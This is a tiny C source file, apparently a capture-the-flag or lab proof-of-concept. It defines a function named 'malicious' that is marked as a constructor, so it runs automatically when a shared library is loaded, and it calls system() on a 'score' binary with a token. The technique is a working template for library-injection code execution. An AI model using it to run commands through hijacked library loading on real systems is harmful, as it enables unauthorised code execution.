#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 4a30e7a4-346a-421b-8b93-d107499b9c67");
}
